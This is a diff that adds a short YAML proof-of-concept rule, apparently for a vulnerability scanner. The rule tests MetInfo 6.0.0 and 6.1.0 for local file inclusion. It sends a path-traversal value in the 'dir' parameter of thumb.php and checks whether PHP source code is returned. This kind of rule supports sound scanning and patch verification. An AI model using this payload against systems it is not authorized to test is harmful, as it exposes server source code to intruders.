@@ -1,0 +1,12 @@
+name: poc-yaml-metinfo-lfi
+rules:
+  - method: GET
+    path: /include/thumb.php?dir=http\..\index.php
+    follow_redirects: true
+    expression: |
+      body.bcontains(b'<?php') && body.bcontains(b'if(file_exists(')
+detail:
+  author: JingLing(https://hackfun.org/)
+  metinfo_version: 6.0.0,6.1.0
+  links:
+    - https://paper.seebug.org/676/
